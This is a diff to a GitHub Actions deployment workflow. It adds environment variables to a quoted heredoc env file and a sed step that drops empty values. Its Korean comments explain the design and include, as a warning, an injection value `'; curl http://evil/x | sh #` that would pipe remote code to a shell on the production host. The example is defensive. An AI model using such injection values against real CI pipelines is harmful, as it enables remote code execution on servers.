@@ -91,6 +91,13 @@ jobs:
             OPENAI_FAST_REASONING_EFFORT=${{ vars.OPENAI_FAST_REASONING_EFFORT }}
             OPENAI_SMART_REASONING_EFFORT=${{ vars.OPENAI_SMART_REASONING_EFFORT }}
             APP_ENVIRONMENT=${{ vars.APP_ENVIRONMENT }}
+            # [#258] 코드 기본값은 off(CI/로컬 DB 없는 환경 보호, 2026-08-08 CI hang 회귀).
+            # 운영에서 켜려면 두 저장소 변수(Settings → Variables 탭)를 "true" 로 등록한다.
+            # 미등록이면 빈 문자열이 들어가지만 기동은 죽지 않는다 —
+            # `_empty_color_synonym_gate_settings_use_default`(app/core/config.py, PR #447
+            # 리뷰)가 빈 값을 필드 기본값(off)으로 해석해 기능이 꺼진 채 정상 기동한다.
+            COLOR_SYNONYM_EXPANSION_ENABLED=${{ vars.COLOR_SYNONYM_EXPANSION_ENABLED }}
+            COLOR_SYNONYM_ARRAY_CONTRACT_READY=${{ vars.COLOR_SYNONYM_ARRAY_CONTRACT_READY }}
             # [2026-08-06] 클라이언트 IP 판별 — 도메인 전환 후 실측한 값이다.
             #   브라우저 → Cloudflare → ALB → FastAPI 경로라 XFF 가 2개
             #   (사용자IP, Cloudflare IP)로 도착한다. 오른쪽에서 2번째가 사용자.
@@ -110,7 +117,30 @@ jobs:
             EMBEDDING_MODEL_ID=${{ vars.EMBEDDING_MODEL_ID }}
             EMBEDDING_DIM=${{ vars.EMBEDDING_DIM }}
             CORS_ORIGINS=${{ vars.CORS_ORIGINS }}
+            MODEL_PRICE_IN_PER_1K=${{ vars.MODEL_PRICE_IN_PER_1K }}
+            MODEL_PRICE_OUT_PER_1K=${{ vars.MODEL_PRICE_OUT_PER_1K }}
+            SPRING_MAX_RETRIES=${{ vars.SPRING_MAX_RETRIES }}
+            RESCUE_BUDGET_MODE=${{ vars.RESCUE_BUDGET_MODE }}
             ENVEOF
+
+            # 3b. [#437/#532, PR #539 리뷰] 위 네 키의 (A) 조건부 규약(미등록 Variable = 줄 없음 =
+            #     코드 기본값)은 heredoc **안**에서 값을 쓰고 빈 줄만 사후에 지우는 방식으로만
+            #     구현한다 — **`${{ vars.X }}` 를 실행되는 셸 문장(예: `V='${{ vars.X }}'`)에 직접
+            #     스플라이스하면 안 된다.** `${{ }}` 는 셸이 보기 전에 GitHub Actions 가 텍스트로
+            #     치환하므로, 그 결과가 실행 문장 안에 들어가면 값에 작은따옴표 하나만 있어도
+            #     리터럴이 거기서 끝나고 이어지는 텍스트가 운영 EC2 에서 그대로 실행된다(예:
+            #     값이 `'; curl http://evil/x | sh #` 면 원격 코드 실행 — 최초 구현이 이 함정에
+            #     빠져 리뷰로 지적됐다). 위 quoted heredoc(`cat << 'ENVEOF'`) 본문은 셸이 전혀
+            #     재해석하지 않는 **데이터**라 이 경로가 구조적으로 없다 — 그래서 네 키도 기존
+            #     19+줄과 똑같이 heredoc 안에 쓰고, 빈/공백뿐인 값만 아래에서 줄째 삭제해 (A)
+            #     규약을 지킨다. sed 대상은 이 네 키로 **한정**한다(기존 줄은 손대지 않는다).
+            #     `set -e` 아래라 sed 실패는 배포를 그대로 중단시킨다(의도된 동작). `sed -i` 는
+            #     같은 디렉터리에 임시 파일을 만들고 원본으로 rename 하는데, GNU sed 는 그
+            #     임시 파일에 원본 $ENV_FILE 의 권한을 그대로 복사한다(umask 와 무관 — 로컬
+            #     실측 확인: umask 077 로 만든 0600 파일을 이후 umask 022 로 sed -i 해도 0600
+            #     유지). 위 `umask 077` 은 최초 heredoc 생성 시점에 $ENV_FILE 자체를 0600 으로
+            #     만드는 역할이고, sed 는 그 권한을 깨지 않고 물려받을 뿐이다.
+            sed -i -E '/^(MODEL_PRICE_IN_PER_1K|MODEL_PRICE_OUT_PER_1K|SPRING_MAX_RETRIES|RESCUE_BUDGET_MODE)=[[:space:]]*$/d' "$ENV_FILE"
 
             # 4. 교체 — 8000 포트를 새 컨테이너가 이어받아야 하므로 중지 후 기동
             #    docker run 뒤의 || true 는 필수: 기동 명령 자체가 실패해도
